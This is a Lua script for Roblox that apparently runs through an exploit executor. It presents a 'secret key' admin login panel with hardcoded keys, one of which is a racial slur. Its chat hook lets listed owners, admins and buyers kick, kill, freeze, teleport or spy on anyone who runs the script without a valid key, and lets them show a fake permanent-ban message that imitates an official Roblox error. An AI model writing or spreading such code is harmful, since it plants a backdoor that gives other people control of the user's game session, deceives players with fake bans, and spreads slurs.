local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local lp = Players.LocalPlayer
local guiVisible = false
getgenv().Authorized = false

-- üîê Add your real usernames here
local owners = {""}  -- REPLACE with real usernames
local admins = {}
local buyers = {}

local loginKeys = {
    "nigger1",
    "hyperlolz1",
    "Buyerlucas1",
    "Buyerbigtoenail15"
}

-- GUI
local gui = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
gui.Name = "LoginGui"
gui.ResetOnSpawn = false
gui.Enabled = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "Enter Secret Key"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18

local textbox = Instance.new("TextBox", frame)
textbox.Size = UDim2.new(1, -20, 0, 30)
textbox.Position = UDim2.new(0, 10, 0, 40)
textbox.PlaceholderText = "Secret Key"
textbox.Text = ""
textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
textbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
textbox.BorderSizePixel = 0
textbox.Font = Enum.Font.SourceSans
textbox.TextSize = 16
textbox.ClearTextOnFocus = false

local timerLabel = Instance.new("TextLabel", frame)
timerLabel.Size = UDim2.new(1, 0, 0, 20)
timerLabel.Position = UDim2.new(0, 0, 1, -20)
timerLabel.BackgroundTransparency = 1
timerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
timerLabel.Text = "Time left: 20"
timerLabel.Font = Enum.Font.SourceSans
timerLabel.TextSize = 14

local function notify(msg)
    StarterGui:SetCore("SendNotification", {
        Title = "Login",
        Text = msg,
        Duration = 3
    })
end

local function showLoginGui()
    if guiVisible or getgenv().Authorized then return end
    guiVisible = true
    gui.Enabled = true

    local seconds = 20
    timerLabel.Text = "Time left: " .. seconds

    coroutine.wrap(function()
        while seconds > 0 and gui.Enabled and not getgenv().Authorized do
            wait(1)
            seconds -= 1
            timerLabel.Text = "Time left: " .. seconds
        end
        if not getgenv().Authorized then
            gui:Destroy()
            guiVisible = false
        end
    end)()
end

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.F1 then
        textbox.Text = ""
        showLoginGui()
    end
end)

lp.Chatted:Connect(function(msg)
    if msg:lower() == ".open" and not getgenv().Authorized then
        textbox.Text = ""
        showLoginGui()
    end
end)

local viewingOwner = nil

local function isAuthorized(player)
    for _, v in ipairs(owners) do if player.Name == v then return true end end
    for _, v in ipairs(admins) do if player.Name == v then return true end end
    for _, v in ipairs(buyers) do if player.Name == v then return true end end
    return false
end

-- === üîß Command effects ===
local function bring(owner)
    if lp.Character and owner.Character then
        lp.Character:SetPrimaryPartCFrame(owner.Character:GetPrimaryPartCFrame())
    end
end

local function freeze()
    if lp.Character then
        local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = true end
    end
end

local function unfreeze()
    if lp.Character then
        local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = false end
    end
end

local function view(owner)
    if owner.Character then
        lp.CameraMode = Enum.CameraMode.LockFirstPerson
        lp.CameraSubject = owner.Character:FindFirstChildOfClass("Humanoid")
        viewingOwner = owner
    end
end

local function unview()
    if lp.Character then
        lp.CameraMode = Enum.CameraMode.Classic
        lp.CameraSubject = lp.Character:FindFirstChildOfClass("Humanoid")
        viewingOwner = nil
    end
end

-- === üîß Command listener ===
local function hookChat(player)
    player.Chatted:Connect(function(msg)
        if not msg then return end

        msg = msg:lower()

        if msg == "/commands" and player == lp then
            notify("Available: /kick . /bring . /freeze . /unfreeze . /view . /unview . /kill . /ban .")
            return
        end

        if not isAuthorized(player) then return end

        if player == lp or not getgenv().Authorized then
            if msg == "/kick ." then
                lp:Kick("You have been kicked by an admin.")
            elseif msg == "/bring ." then
                bring(player)
            elseif msg == "/freeze ." then
                freeze()
            elseif msg == "/unfreeze ." then
                unfreeze()
            elseif msg == "/view ." then
                view(player)
            elseif msg == "/unview ." then
                unview()
            elseif msg == "/kill ." then
                local h = lp.Character and lp.Character:FindFirstChild("Humanoid")
                if h then h.Health = 0 end
            elseif msg == "/ban ." then
                lp:Kick("You have been permanently banned from this experience. (Error Code: 267)")
            end
        end
    end)
end

-- üîê Multi-key login
_G.CheckKey = function(input)
    if getgenv().Authorized then return end
    for _, key in ipairs(loginKeys) do
        if input == key then
            getgenv().Authorized = true
            notify("Login successful!")
            hookChat(lp)  -- Now YOU can use commands too
            gui:Destroy()
            return
        end
    end
    notify("Invalid key!")
end

textbox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        _G.CheckKey(textbox.Text)
    end
end)

-- üß† Dynamic command hookup for admins/owners/buyers
local function onPlayerAdded(player)
    if isAuthorized(player) then
        hookChat(player)
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    onPlayerAdded(p)
end

Players.PlayerAdded:Connect(onPlayerAdded)
